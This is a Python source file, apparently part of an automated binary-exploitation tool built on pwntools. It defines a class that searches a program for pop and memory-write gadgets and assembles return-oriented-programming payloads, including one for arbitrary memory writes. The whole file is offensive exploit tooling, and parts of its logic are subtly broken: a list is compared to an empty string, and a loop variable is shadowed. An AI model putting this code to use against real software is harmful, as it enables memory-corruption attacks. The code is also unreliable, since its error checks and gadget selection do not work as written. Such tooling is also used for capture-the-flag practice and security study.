from pwn import *
from static import Static

class ROP:
    # finds the most memory efficient gadget in an array of gadgets (or at least attempts to)
    def find_optimal_gadget(self, gadgets, targets, completed):
        targets_minimized = [ i for i in targets if i not in completed ]
        gadgets = sorted(gadgets, key=len)
        print(gadgets)
        print(targets_minimized)

        if len(targets) == 1:
            return gadgets[0]

        best_idx = 0
        filled = []

        for bob in range(len(gadgets)):
            alice = []

            for charlie in targets_minimized:
                if charlie in gadgets[bob]:
                    alice.append(charlie)
            
            if len(alice) > len(filled):
                filled = alice
                best_idx = bob
        
        for i in filled:
            completed.append(i)

        return gadgets[best_idx] 

    def use_gadget(self, gadget_used, dict_registers, completed):
        payload = p64(int(gadget_used.split(":")[0], 16))
        print(gadget_used)

        alice = gadget_used.split(":")
        instructions = alice[1].split(";")

        for ins in instructions:
            if "mov" in ins:
                continue

            # ins[-3:] is the register popped
            reg = ins[-3:].strip()

            if reg == "ret":
                break

            if reg in dict_registers.keys():
                if type(dict_registers[reg]) is int:
                    payload += p64(dict_registers[reg])
                else:
                    payload += dict_registers[reg]
                
                completed.append(reg)

            else:
                payload += p64(0xdeadbeef)

        return payload

    # this function will create a ROP chain that populates wanted registers
    def generate_rop_chain(self, app, dict_registers):
        payload = b""
        completed = []

        for reg in dict_registers.keys():
            # check if the value has not already been met
            if reg not in completed:
                # use a gadget that has only pop in it because if not then it can get risky
                use = []

                for file, gadget in app.rs.search(search=f"pop {reg}"):
                    tmp = [ i for i in str(gadget).split(";") ]
                    cool = True

                    for i in tmp:
                        if "pop" not in i and "ret" not in i and i != " ":
                            cool = False

                    if cool:
                        use.append(str(gadget))

                if use == "":
                    print("[!] Could not find gadget.")
                    return None

                # find the gadget that completes the most regs
                tmp = []
                complete = True
                gadget_used = self.find_optimal_gadget(use, dict_registers.keys(), tmp)
                
                for reg in completed:
                    if reg not in tmp:
                        # find smallest gadget
                        complete = False
                        tmp = completed
                        gadget_used = self.find_optimal_gadget(use, dict_registers.keys(), tmp)

                        # we have found our gadget, now time to add it to our payload 
                        payload += self.use_gadget(gadget_used, dict_registers, completed)

                # if this gadget can fill all our progress up at once, then replace payload
                if complete:
                    payload = self.use_gadget(gadget_used, dict_registers, completed)

            
        return payload

    # finds write gadget that had regs that are modifiable
    def arbitrary_write(self, app, dst, val, modify_rdi=False):
        s = Static()
        payload = None

        for file, gadget in app.rs.search(search=f"mov qword ptr"):
            bob = str(gadget)

            temp = bob.split(": ")
            temp = temp[1].split(";")
            temp = temp[0]
            
            alice = s.get_registers(temp.encode())
            charlie = b"rdi" in alice[1]
            
            if modify_rdi and not charlie:
                payload = self.generate_rop_chain(app, { alice[0].decode(): dst, alice[1].decode(): val, "rdi": dst })
            else: 
                payload = self.generate_rop_chain(app, { alice[0].decode(): dst, alice[1].decode(): val })
            
            if payload:
                payload += self.use_gadget(bob, {}, [])
                
                if modify_rdi and charlie:
                    payload += self.generate_rop_chain(app, { "rdi": dst })

                break

        return payload
        
